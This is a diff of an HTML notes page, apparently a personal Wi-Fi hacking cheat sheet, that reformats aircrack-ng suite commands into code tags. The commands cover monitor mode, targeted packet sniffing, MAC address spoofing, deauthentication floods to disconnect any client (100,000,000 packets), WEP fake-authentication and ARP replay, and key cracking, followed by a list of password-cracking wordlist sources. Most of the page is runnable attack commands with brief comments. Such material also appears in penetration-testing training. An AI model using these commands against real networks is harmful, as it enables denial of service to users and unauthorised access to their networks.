@@ -213,71 +213,72 @@ to do same attacks</em></p>
 <p><em>first enable monitor mode; then</em></p>
 <ul>
 <li>
-<p>ifconfig wlan0 down</p>
+<p><code>ifconfig wlan0 down</code></p>
 </li>
 <li>
-<p>airmon-ng check kill ( to kill the manager)</p>
+<p><code>airmon-ng check kill</code> ( to kill the manager)</p>
 </li>
 <li>
-<p>iwconfig wlan0 mode monitor</p>
+<p><code>iwconfig wlan0 mode monitor</code></p>
 </li>
 <li>
-<p>ifconfig wlan0 up</p>
+<p><code>ifconfig wlan0 up</code></p>
 </li>
 <li>
-<p>iwconfig ( to check)</p>
+<p><code>iwconfig</code> ( to check)</p>
 </li>
 </ul>
 <hr>
 <h1 id="network-preconnection-attacktxt">network preconnection attack.txt<a href="#network-preconnection-attacktxt" class="hanchor" ariaLabel="Anchor">#</a> </h1>
 <p><em>note: need monitor mode on</em></p>
 <ul>
-<li>airodump-ng wlan0 ( discover all wireless network and info around it)</li>
+<li><code>airodump-ng wlan0 ( discover all wireless network and info around it)</code></li>
 </ul>
 <p><em>sniff and discover 5Ghz networks</em></p>
 <ul>
-<li>airodump-ng &ndash;band a wlan0  (a = 5Ghz)</li>
+<li><code>airodump-ng --band a wlan0</code>  (a = 5Ghz)</li>
 </ul>
 <p><em>for sniffing multiple bands ( 2.4 &amp; 5)</em></p>
 <ul>
-<li>airodump-ng &ndash;band abg wlan0  ( all frequency)</li>
+<li><code>airodump-ng --band abg wlan0</code>  ( all frequency)</li>
 </ul>
 <p>*to siff only target network **</p>
 <ul>
-<li>airodump-ng  &ndash;bssid XX:XX:XX:XX:XX:XX &ndash;channel X &ndash;write test wlan0</li>
+<li><code>airodump-ng  --bssid XX:XX:XX:XX:XX:XX --channel X --write test wlan0</code></li>
 </ul>
 <p>{ <em>&ldquo;channel&rdquo; for airodump-ng to sniff on and &ldquo;write&rdquo; for storing data in file</em> (xxxx.cap)}</p>
 <ul>
-<li>wireshark ( <em>to lauch wireshark or can open manually to check the xxxx.cap file filled with target data</em>)</li>
+<li><code>wireshark</code> ( <em>to lauch wireshark or can open manually to check the xxxx.cap file filled with target data</em>)</li>
 </ul>
 <hr>
 <h1 id="change-your-mac-adresss">change your mac adresss:<a href="#change-your-mac-adresss" class="hanchor" ariaLabel="Anchor">#</a> </h1>
 <ul>
 <li>
-<p>ifconfig wlan0 down (to make wlan0 down)</p>
+<p><code>ifconfig wlan0 down</code> (to make wlan0 down)</p>
 </li>
 <li>
-<p>ifconfig wlan0 hw ether XX:XX:XX:XX:XX:XX ( <em>random mac address</em>)</p>
+<p><code>ifconfig wlan0 hw ether XX:XX:XX:XX:XX:XX</code> ( <em>random mac address</em>)</p>
 </li>
 <li>
-<p>ifconfig wlan0 up (<em>to make wlan0 up again</em>)</p>
+<p><code>ifconfig wlan0 up</code> (<em>to make wlan0 up again</em>)</p>
 </li>
 <li>
-<p>ifconfig ( *to check *)</p>
+<p><code>ifconfig</code> ( *to check *)
+``</p>
 </li>
 </ul>
 <hr>
 <h1 id="deauthentication-attack--disconnect-any-client-form-any-network">deauthentication attack ( disconnect any client form any network)<a href="#deauthentication-attack--disconnect-any-client-form-any-network" class="hanchor" ariaLabel="Anchor">#</a> </h1>
 <ul>
-<li>aireplay-ng &ndash;deauth [deauth Pacekts] -a [Network Mac add] -c [Target Mac add]  [Interface]</li>
+<li><code>aireplay-ng --deauth [deauth Pacekts] -a [Network Mac add] -c [Target Mac add]  [Interface]</code></li>
 </ul>
 <p><em>run airodump-ng in parallel terminal against the target network</em></p>
 <ul>
 <li>
-<p>airodump-ng  &ndash;bssid XX:XX:XX:XX:XX:XX &ndash;channel X wlan0 (<em>no need of &ndash;write if u dont want file</em>)</p>
+<p><code>airodump-ng  --bssid XX:XX:XX:XX:XX:XX --channel X wlan0</code> (<em>no need of &ndash;write if u dont want file</em>)</p>
 </li>
 <li>
-<p>aireplay-ng &ndash;deauth 100000000 -a XX:XX:XX:XX:XX:XX -c XX:XX:XX:XX:XX:XX  -D wlan0</p>
+<p><code>aireplay-ng --deauth 100000000 -a XX:XX:XX:XX:XX:XX -c XX:XX:XX:XX:XX:XX  -D wlan0</code></p>
 </li>
 </ul>
 <p>{ <em>100000000 give max packets to deauth for long time; &ldquo;-D&rdquo; if client is on 5Ghz network
@@ -285,31 +286,31 @@ and if its in 2.4Ghz then remove the &ldquo;-D&rdquo;</em>}</p>
 <p><em>if client still has access to other networks then split the terminal and run same attack parallel on that network</em></p>
 <hr>
 <h1 id="fake-authentication-attack-wep">Fake authentication attack (wep)<a href="#fake-authentication-attack-wep" class="hanchor" ariaLabel="Anchor">#</a> </h1>
-<p><em>forcing AP to generate new packets with new IVs</em></p>
+<p><em>forcing AP to generate new packets with new IVs</em>``</p>
 <ul>
 <li>
-<p>aireplay-ng &ndash;fakeauth 0 -a [network Mac add] -h[our Mac add] wlan0</p>
+<p><code>aireplay-ng --fakeauth 0 -a [network Mac add] -h[our Mac add] wlan0</code></p>
 </li>
 <li>
-<p>airodump-ng &ndash;bssid XX:XX:XX:XX:XX:XX &ndash;channel x &ndash;write xxxx wlan0
+<p><code>airodump-ng --bssid XX:XX:XX:XX:XX:XX --channel x --write xxxx wlan0</code>
 (<em>sniffing target network with storing data and runnig parallely</em>)</p>
 </li>
 <li>
-<p>aireplay-ng &ndash;fakeauth 0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0
+<p><code>aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0</code>
 (<em>0 for doing fake authentication attack once</em> )</p>
 </li>
 </ul>
 <p><em>running arpreplay attack</em></p>
 <ul>
-<li>aireplay-ng &ndash;arpreplay -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0</li>
+<li><code>aireplay-ng --arpreplay -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0</code></li>
 </ul>
 <p><em>associate data 1 more time</em></p>
 <ul>
 <li>
-<p>aireplay-ng &ndash;fakeauth 0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0</p>
+<p><code>aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0</code></p>
 </li>
 <li>
-<p>aircrack-ng xxxx.cap</p>
+<p><code>aircrack-ng xxxx.cap</code></p>
 </li>
 </ul>
 <hr>
@@ -323,16 +324,16 @@ iv is sent in plain text</em></p>
 *wireless adapter in monitor mode</p>
 <ul>
 <li>
-<p>airodump-ng wlan0 (  <em>discover all wireless network and info around it in parallel terminal</em>)</p>
+<p><code>airodump-ng wlan0</code> (  <em>discover all wireless network and info around it in parallel terminal</em>)</p>
 </li>
 <li>
-<p>airodump-ng  &ndash;bssid XX:XX:XX:XX:XX:XX &ndash;channel X &ndash;write test wlan0<br>
+<p><code>airodump-ng  --bssid XX:XX:XX:XX:XX:XX --channel X --write test wlan0</code><br>
 ( <em>to capture packets of specefic target network and &ldquo;&ndash;write&rdquo; to sotred data in file</em>)</p>
 </li>
 </ul>
 <p><strong>step2:</strong></p>
 <ul>
-<li>aircrack-ng xxxx.cap (xxxx.cap = file name)</li>
+<li><code>aircrack-ng xxxx.cap</code> (xxxx.cap = file name)</li>
 </ul>
 <p><em>will get key and ascii password, can connect through both and for key remove the colon</em></p>
 <hr>
@@ -375,6 +376,7 @@ Use: Additional wordlists for password cracking and penetration testing.
 Use: A SourceForge project offering a variety of wordlists for password cracking and security testing.
 <a href="http://wordlist.sourceforge.net/">http://wordlist.sourceforge.net/</a></p>
 <hr>
+<p>[Crusveder]</p>
 
       </div></div>
 
